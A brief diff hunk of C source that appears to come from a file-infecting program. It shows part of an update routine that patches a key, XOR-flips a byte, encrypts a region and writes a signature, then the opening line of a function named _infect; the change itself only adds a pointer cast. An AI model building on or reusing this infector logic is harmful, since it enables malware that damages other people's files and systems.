@@ -81,7 +81,7 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt,
 	p[4] = ((size_t*)key)[1];
 	*(unsigned char*)(p + 3) ^= 0b01110010;
 	encrypt((char*)(p+5), 15, (uint32_t*)key);
-	get_sig(s, sn, n, p + 7);
+	get_sig(s, sn, n, (char*)(p + 7));
 }
 
 static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
